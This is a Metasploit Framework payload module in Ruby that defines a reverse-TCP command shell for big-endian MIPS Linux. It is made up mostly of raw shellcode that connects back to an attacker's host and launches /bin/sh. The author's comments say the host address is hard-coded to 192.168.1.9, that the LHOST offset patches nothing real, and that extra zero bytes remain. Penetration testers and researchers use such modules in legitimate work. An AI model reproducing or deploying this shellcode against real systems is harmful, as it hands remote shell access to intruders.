##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

# Written in a hurry using shellforge and my MIPS shellforge loader (avail. on cr0.org)

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Linux
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'Julien Tinnes',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_MIPSBE,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
# FIXME: LHOST does'nt patch anything real, host is fixed to 192.168.1.9
# Get shellcode with String.cpu=Metasm::MIPS.new
# 	             sc.decode
# (but Metasploit's version is buggy)
# We need to patch this: (C0A80109 = 192.168.1.9)
#     lui $t0, -3f58h                              ; @4ch  3c08c0a8
#     ori $a2, $t0, 109h                           ; @50h  35060109
							'LHOST'    => [ 0x130, 'ADDR' ],
							'LPORT'    => [ 0x5E, 'n'    ],
						},
					'Payload' =>
						"\x24\x09\xff\xef\x05\x10\xff\xff\x28\x08\x82\x82\x01\x20\x48\x27" +
						"\x01\x3f\xc8\x21\xaf\xb9\x85\x48\x23\xb9\x85\x48\x3c\x1c\x00\x00" +
						"\x27\x9c\x00\x00\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbc\x00\x00" +
						"\xaf\xbc\x00\x28\x8f\x84\x00\x00\x00\x00\x00\x00\x24\x84\x00\xf8" +
						"\x00\x00\x00\x00\x8c\x85\x00\x00\x8c\x87\x00\x04\x3c\x08\xc0\xa8" +
						"\x35\x06\x01\x09\x27\xb9\x00\x18\x24\x03\x00\x02\x24\x02\x12\x26" +
						"\xaf\xa5\x00\x18\xaf\xa6\x00\x0c\xaf\xa7\x00\x1c\xa7\xa3\x00\x08" +
						"\xa7\xa2\x00\x0a\xaf\xb9\x00\x20\xaf\xa0\x00\x24\x24\x04\x00\x02" +
						"\x24\x05\x00\x02\x00\x00\x30\x21\x24\x02\x10\x57\x00\x00\x00\x0c" +
						"\x24\x04\xff\xff\x10\x44\x00\x1a\x00\x40\x18\x21\x00\x60\x20\x21" +
						"\x24\x06\x00\x10\x27\xa5\x00\x08\x24\x02\x10\x4a\x00\x00\x00\x0c" +
						"\x14\x40\x00\x0e\x00\x00\x28\x21\x24\x02\x0f\xdf\x00\x00\x00\x0c" +
						"\x24\x05\x00\x01\x24\x02\x0f\xdf\x00\x00\x00\x0c\x24\x05\x00\x02" +
						"\x24\x02\x0f\xdf\x00\x00\x00\x0c\x03\x20\x20\x21\x27\xa5\x00\x20" +
						"\x00\x00\x30\x21\x24\x02\x0f\xab\x00\x00\x00\x0c\x00\x00\x20\x21" +
						"\x24\x02\x0f\xa1\x00\x00\x00\x0c\x03\xe0\x00\x08\x27\xbd\x00\x30" +
						"\x24\x04\x00\x01\x24\x02\x0f\xa1\x00\x00\x00\x0c\x10\x00\xff\xe4" +
						"\x00\x60\x20\x21\x2f\x62\x69\x6e\x2f\x73\x68\x00"+"0"*80
# FIXME: remove extra 0 bytes!

				}
			))
	end

end
